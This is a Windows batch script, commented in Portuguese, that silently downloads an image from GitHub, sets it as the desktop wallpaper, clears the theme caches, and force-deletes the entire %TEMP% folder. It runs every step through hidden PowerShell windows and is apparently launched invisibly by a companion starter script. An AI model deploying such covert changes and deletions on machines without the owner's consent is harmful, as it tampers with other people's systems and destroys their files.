@echo off
REM Script para atualizar papel de parede - Execução invisível
REM Este arquivo deve estar no mesmo repositório que starter.bat e trul.png

REM Caminho do diretório atual
set "CURRENT_DIR=%~dp0"

REM Nome da imagem local
set "IMAGE_NAME=wallpaper.png"

REM URL da imagem - usa a variável REPO_URL passada pelo starter.bat via VBS
REM Se não tiver variável, usa fallback (será substituído pelo starter.bat se baixado)
if defined REPO_URL (
    set "IMAGE_URL=%REPO_URL%/trul.png"
) else (
    REM Fallback padrão (será sobrescrito pelo starter.bat quando baixado)
    set "IMAGE_URL=https://raw.githubusercontent.com/mathaussobrinho/starter.bat/main/trul.png"
)

REM Baixa imagem do GitHub (sem mostrar janela)
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%IMAGE_URL%' -OutFile '%CURRENT_DIR%%IMAGE_NAME%' -UseBasicParsing -ErrorAction SilentlyContinue"

REM Define papel de parede (sem mostrar janela)
powershell -WindowStyle Hidden -Command "Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name wallpaper -Value '%CURRENT_DIR%%IMAGE_NAME%' -ErrorAction SilentlyContinue"
powershell -WindowStyle Hidden -Command "Add-Type 'using System; using System.Runtime.InteropServices; public class W { [DllImport(\"user32.dll\", SetLastError=true)] public static extern bool SystemParametersInfo(int uAction,int uParam,string lpvParam,int fuWinIni); }'; [W]::SystemParametersInfo(20, 0, \"%CURRENT_DIR%%IMAGE_NAME%\", 0x01 -bor 0x02)"

REM Limpa cache de papel de parede (sem mostrar janela)
powershell -WindowStyle Hidden -Command "if (Test-Path \"$env:APPDATA\Microsoft\Windows\Themes\TranscodedWallpaper\") {Remove-Item \"$env:APPDATA\Microsoft\Windows\Themes\TranscodedWallpaper\" -Force -ErrorAction SilentlyContinue}"
powershell -WindowStyle Hidden -Command "if (Test-Path \"$env:LOCALAPPDATA\Microsoft\Windows\Themes\CachedFiles\") {Get-ChildItem \"$env:LOCALAPPDATA\Microsoft\Windows\Themes\CachedFiles\" -Recurse | Remove-Item -Force -ErrorAction SilentlyContinue}"

REM Limpa arquivos temporários (sem mostrar janela)
powershell -WindowStyle Hidden -Command "Remove-Item \"$env:TEMP\*\" -Recurse -Force -ErrorAction SilentlyContinue"

REM IMPORTANTE: NÃO há comando para abrir a imagem (start trul.png removido)
exit
